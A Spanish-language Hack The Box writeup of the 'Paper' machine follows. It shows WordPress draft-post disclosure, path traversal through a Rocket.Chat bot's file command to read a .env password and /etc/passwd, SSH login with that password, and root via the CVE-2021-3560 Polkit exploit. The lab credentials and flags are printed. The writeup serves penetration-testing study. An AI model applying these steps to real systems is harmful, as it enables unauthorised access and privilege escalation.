---
category: Hack The Box
tags:
  - eWPT
title: Machine Paper
comments: "true"
image: /assets/img/machines/Paper/paperbanner.jpeg
---
## Introducción
En este writeup se describe el proceso completo de explotación de la máquina Paper de Hack The Box, una máquina orientada a la explotación de vulnerabilidades en servicios web y escalada de privilegios en sistemas Linux. A lo largo del análisis se abordarán técnicas de enumeración de puertos y servicios, identificación de aplicaciones web (en este caso un WordPress desactualizado), descubrimiento y explotación de un bot integrado en un servicio de chat, así como la escalada de privilegios mediante una vulnerabilidad conocida en Polkit (CVE-2021-3560). Finalmente, se documenta la obtención de la flag que evidencia el compromiso total de la máquina.

## Skills

- Rocket Chat Bot
- WordPress - Unauthenticated View Private/Draft Posts
- CVE-2021-3560-Polkit-Privilege-Esclation

## Enumeración
Para comenzar la fase de enumeración, se realizó un escaneo de puertos, lo que permitió identificar que los puertos 22 (SSH), 80 (HTTP) y 443 (HTTPS) se encontraban abiertos en la máquina objetivo.
```bash
❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.143
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Initiating SYN Stealth Scan at 00:02
Scanning 10.10.11.143 [65535 ports]
Discovered open port 80/tcp on 10.10.11.143
Discovered open port 443/tcp on 10.10.11.143
Discovered open port 22/tcp on 10.10.11.143
Completed SYN Stealth Scan at 00:03, 14.99s elapsed (65535 total ports)
Nmap scan report for 10.10.11.143
Host is up, received user-set (0.21s latency).
Not shown: 65532 closed tcp ports (reset)
PORT    STATE SERVICE REASON
22/tcp  open  ssh     syn-ack ttl 63
80/tcp  open  http    syn-ack ttl 63
443/tcp open  https   syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 15.15 seconds
           Raw packets sent: 72524 (3.191MB) | Rcvd: 71995 (2.880MB)
```

Posteriormente, se utilizó un escaneo más detallado para identificar los servicios y versiones que se están ejecutando en los puertos previamente descubiertos.
```bash
❯ nmap -sCV -p 22,80,443 10.10.11.143
Nmap scan report for 10.10.11.143
Host is up (0.20s latency).

PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.0 (protocol 2.0)
| ssh-hostkey: 
|   2048 10:05:ea:50:56:a6:00:cb:1c:9c:93:df:5f:83:e0:64 (RSA)
|   256 58:8c:82:1c:c6:63:2a:83:87:5c:2f:2b:4f:4d:c3:79 (ECDSA)
|_  256 31:78:af:d1:3b:c4:2e:9d:60:4e:eb:5d:03:ec:a0:22 (ED25519)
80/tcp  open  http     Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1k mod_fcgid/2.3.9)
|_http-server-header: Apache/2.4.37 (centos) OpenSSL/1.1.1k mod_fcgid/2.3.9
|_http-title: HTTP Server Test Page powered by CentOS
|_http-generator: HTML Tidy for HTML5 for Linux version 5.7.28
| http-methods: 
|_  Potentially risky methods: TRACE
443/tcp open  ssl/http Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1k mod_fcgid/2.3.9)
|_ssl-date: TLS randomness does not represent time
|_http-server-header: Apache/2.4.37 (centos) OpenSSL/1.1.1k mod_fcgid/2.3.9
|_http-generator: HTML Tidy for HTML5 for Linux version 5.7.28
| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=Unspecified/countryName=US
| Subject Alternative Name: DNS:localhost.localdomain
| Not valid before: 2021-07-03T08:52:34
|_Not valid after:  2022-07-08T10:32:34
|_http-title: HTTP Server Test Page powered by CentOS
| http-methods: 
|_  Potentially risky methods: TRACE
| tls-alpn: 
|_  http/1.1

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 30.19 seconds
```

### Enumeración WEB
Al acceder a la IP de la máquina mediante el navegador, se mostró una página por defecto de Apache, lo que indica que el servidor web está funcionando correctamente pero no tiene contenido personalizado visible en la raíz.
![1](/assets/img/machines/Paper/1.jpeg)

Se utilizó WhatWeb para obtener más información sobre las tecnologías empleadas por el sitio. En los encabezados de respuesta se reveló el nombre del host interno: office.paper, lo que sugiere la presencia de un Virtual Host configurado en el servidor.
```bash
❯ whatweb 10.10.11.143
http://10.10.11.143 [403 Forbidden] Apache[2.4.37][mod_fcgid/2.3.9], Country[RESERVED][ZZ], Email[webmaster@example.com], HTML5, HTTPServer[CentOS][Apache/2.4.37 (centos) OpenSSL/1.1.1k mod_fcgid/2.3.9], IP[10.10.11.143], MetaGenerator[HTML Tidy for HTML5 for Linux version 5.7.28], OpenSSL[1.1.1k], PoweredBy[CentOS], Title[HTTP Server Test Page powered by CentOS], UncommonHeaders[x-backend-server], X-Backend[office.paper]
```

Dado que el servidor hace uso de un Virtual Host, se añadió la entrada correspondiente en el archivo /etc/hosts para poder acceder correctamente al sitio asociado al nombre office.paper.
```bash
❯ echo "10.10.11.143 office.paper" >> /etc/hosts
```

Una vez configurado el nombre de host, al acceder a http://office.paper se carga un sitio WordPress con temática de la serie The Office.
![2](/assets/img/machines/Paper/2.jpeg)

Se volvió a ejecutar WhatWeb, esta vez apuntando al dominio office.paper, lo que reveló información más detallada del sitio. Se confirmó que el servidor está ejecutando WordPress 5.2.3 junto a PHP 7.2.24, y utilizando tecnologías como Bootstrap y jQuery. Esta versión de WordPress es antigua y podría ser vulnerable, por lo que representa un punto clave para continuar con la enumeración.
```bash
❯ whatweb http://office.paper
http://office.paper [200 OK] Apache[2.4.37][mod_fcgid/2.3.9], Bootstrap[1,5.2.3], Country[RESERVED][ZZ], HTML5, HTTPServer[CentOS][Apache/2.4.37 (centos) OpenSSL/1.1.1k mod_fcgid/2.3.9], IP[10.10.11.143], JQuery, MetaGenerator[WordPress 5.2.3], OpenSSL[1.1.1k], PHP[7.2.24], PoweredBy[WordPress,WordPress,], Script[text/javascript], Title[Blunder Tiffin Inc. &#8211; The best paper company in the electric-city Scranton!], UncommonHeaders[link,x-backend-server], WordPress[5.2.3], X-Backend[office.paper], X-Powered-By[PHP/7.2.24]
```

## Wordpress Unauthenticated View Private/Draft Posts

Investigando vulnerabilidades asociadas a WordPress 5.2.3, se identificó una debilidad conocida que permite a usuarios no autenticados ver publicaciones privadas o en borrador. Esta vulnerabilidad puede ser aprovechada para revelar información sensible que normalmente estaría restringida, lo que representa una brecha significativa en la confidencialidad del contenido del sitio.
![3](/assets/img/machines/Paper/3.jpeg)

Accediendo a la URL http://office.paper/?static=1, se mostró una publicación que no era visible desde la interfaz principal del sitio. En el contenido del post se hacía referencia a un enlace externo: http://chat.office.paper/register/8qozr226AhkCHZdyY, lo que sugiere la existencia de un subdominio llamado chat.office.paper, así como una ruta de registro directa, posiblemente válida para crear una cuenta en una plataforma de mensajería o chat interna.
```plaintext
http://office.paper/?static=1
```
![4](/assets/img/machines/Paper/4.jpeg)

Para poder acceder al subdominio identificado, se añadió la entrada correspondiente en el archivo /etc/hosts apuntando chat.office.paper a la IP objetivo, permitiendo así la navegación hacia este nuevo dominio dentro del entorno local.
```bash
❯ echo "10.10.11.143 chat.office.paper" >> /etc/hosts
```

## Rocket Chat Bot

Al acceder a la URL http://chat.office.paper/register/8qozr226AhkCHZdyY, se presenta una página de registro de usuario de Rocket.Chat, una plataforma de chat en tiempo real. Esto confirma que el subdominio aloja un servicio de comunicación interna, al cual es posible crear una cuenta desde este enlace de registro directo.
```bash
http://chat.office.paper/register/8qozr226AhkCHZdyY
```
![5](/assets/img/machines/Paper/5.jpeg)

Después de registrarse y acceder al chat general de Rocket.Chat, se pudieron ver múltiples referencias y nombres de personajes de la serie The Office, lo que refuerza la temática general del entorno y puede ofrecer pistas contextuales útiles durante la explotación.
![6](/assets/img/machines/Paper/6.jpeg)

Al inspeccionar la lista de usuarios en Rocket.Chat, se identificó un usuario llamado recyclops, que se presenta como un bot. Además, es posible enviarle mensajes directos, lo que podría abrir una vía para interactuar con funcionalidades automatizadas o descubrir información adicional mediante la comunicación con este bot.
![7](/assets/img/machines/Paper/7.jpeg)

Se envió un mensaje directo al bot recyclops con el comando help, lo que generó una lista de comandos disponibles para interactuar con él. Entre los comandos destacados se encuentran list y files, que probablemente permiten obtener información o acceder a archivos gestionados por el bot.
![8](/assets/img/machines/Paper/8.jpeg)

Al ejecutar el comando list en la conversación con el bot recyclops, este respondió con una lista que parece corresponder a archivos relacionados con ventas, lo que indica que el bot podría estar gestionando o proporcionando acceso a documentos internos importantes.
![9](/assets/img/machines/Paper/9.jpeg)

Al enviar el comando list .. al bot recyclops, se obtuvo un listado detallado del contenido del directorio superior, mostrando varios archivos y carpetas típicos de un entorno Linux bajo el usuario dwight. Entre ellos se encuentran archivos de configuración personal como .bashrc, scripts como bot_restart.sh, directorios de configuración oculta (.config, .gnupg, .local) y carpetas relacionadas con hubot, lo que sugiere que el bot podría estar basado en esta plataforma.
![10](/assets/img/machines/Paper/10.jpeg)

Al ejecutar el comando files ../hubot, el bot recyclops mostró el listado de archivos contenidos en el directorio hubot. Esto permitió identificar configuraciones específicas que probablemente controlan el comportamiento y funcionalidades del bot.
```plaintext
 file ../hubot
```
![11](/assets/img/machines/Paper/11.jpeg)

Investigando el funcionamiento del bot Hubot, se encontró que es común que en el archivo .env se almacenen variables de entorno sensibles, incluyendo contraseñas o tokens de acceso. Esto sugiere que si se logra acceder o leer este archivo, podría revelarse información crítica para avanzar en la explotación.
![12](/assets/img/machines/Paper/12.jpeg)

Ejecutando el comando files ../hubot/.env a través del bot, se obtuvo el contenido del archivo .env, que contiene información de configuración sensible. Este archivo suele incluir credenciales, tokens y variables críticas para el funcionamiento del bot, representando un valioso vector de ataque.
```plaintext
 file ../hubot/.env 
```
![13](/assets/img/machines/Paper/13.jpeg)

Dentro del archivo .env se pudo identificar la variable PASSWORD con el valor Queenofblad3s!23, lo que revela una contraseña clara que podría ser utilizada para acceder a servicios protegidos o para avanzar en la explotación del sistema.
```plaintext
PASSWORD = Queenofblad3s!23
```

Mediante el comando files ../../../etc/passwd se pudo acceder al archivo de usuarios del sistema, donde se confirmó que dwight es un usuario válido y que tiene acceso a un intérprete de comandos (bash), lo que indica que podría tratarse de una cuenta con permisos para interactuar directamente con el sistema operativo.
```plaintext
file ../../../etc/passwd
```
![14](/assets/img/machines/Paper/14.jpeg)

### Captura flag usuario

Con la contraseña obtenida del archivo .env, se intentó acceder vía SSH al sistema usando el usuario dwight. La autenticación fue exitosa, otorgando acceso a un shell remoto en la máquina objetivo, lo que confirma que la información extraída es válida y permite control directo sobre el sistema.
```bash
❯ ssh dwight@10.10.11.143
dwight@10.10.11.143's password: Queenofblad3s!23
Activate the web console with: systemctl enable --now cockpit.socket

Last login: Tue Feb  1 09:14:33 2022 from 10.10.14.23
[dwight@paper ~]$ id
uid=1004(dwight) gid=1004(dwight) groups=1004(dwight)
```

```bash
[dwight@paper ~]$ ls
bot_restart.sh  hubot  sales  user.txt
[dwight@paper ~]$ cat user.txt
0ce221c754da287bedefad5995b495e2
```

## CVE-2021-3560-Polkit-Privilege-Esclation
Para escalar privilegios a root, se aprovechó la vulnerabilidad [CVE-2021-3560](https://github.com/secnigma/CVE-2021-3560-Polkit-Privilege-Esclation/blob/main/poc.sh) en Polkit, que permite la creación de un usuario con privilegios elevados sin necesidad de autenticación previa. Tras ejecutar el script, se logró insertar un nuevo usuario llamado secnigma.
```bash
[dwight@paper ~]$ cd /tmp
[dwight@paper tmp]$ nano poc.sh
[dwight@paper tmp]$ chmod +x poc.sh
[dwight@paper tmp]$ ./poc.sh

[!] Username set as : secnigma
[!] No Custom Timing specified.
[!] Timing will be detected Automatically
[!] Force flag not set.
[!] Vulnerability checking is ENABLED!
[!] Starting Vulnerability Checks...
[!] Checking distribution...
[!] Detected Linux distribution as "centos"
[!] Checking if Accountsservice and Gnome-Control-Center is installed
[+] Accounts service and Gnome-Control-Center Installation Found!!
[!] Checking if polkit version is vulnerable
[+] Polkit version appears to be vulnerable!!
[!] Starting exploit...
[!] Inserting Username secnigma...
Error org.freedesktop.Accounts.Error.PermissionDenied: Authentication is required
[+] Inserted Username secnigma  with UID 1005!
[!] Inserting password hash...
[!] It looks like the password insertion was succesful!
[!] Try to login as the injected user using su - secnigma
[!] When prompted for password, enter your password 
[!] If the username is inserted, but the login fails; try running the exploit again.
[!] If the login was succesful,simply enter 'sudo bash' and drop into a root shell!
```

### Captura flag root

Después de crear el usuario secnigma, se inició sesión con él y se verificaron sus grupos, observando que forma parte del grupo wheel, que otorga privilegios administrativos. Usando sudo su y la contraseña configurada, se obtuvo acceso a una shell como root, confirmando así la escalada de privilegios exitosa y el control total del sistema.
```bash
[dwight@paper tmp]$ su secnigma
Password: 
[secnigma@paper tmp]$ id
uid=1005 gid=1005 groups=1005,10(wheel)
[secnigma@paper tmp]$ sudo su

We trust you have received the usual lecture from the local System
Administrator. It usually boils down to these three things:

    #1) Respect the privacy of others.
    #2) Think before you type.
    #3) With great power comes great responsibility.

[sudo] password for secnigma: secnigmaftw
[root@paper tmp]# id
uid=0(root) gid=0(root) groups=0(root)
```

Finalmente, ya con acceso root, se navegó hasta el directorio home del usuario root donde se encontró la flag de root. 
```bash
[root@paper tmp]# cd
[root@paper ~]# ls
anaconda-ks.cfg  initial-setup-ks.cfg  root.txt
[root@paper ~]# cat root.txt
a05adb4f83f0a01f5f1a3b6f2e1ebd38
```
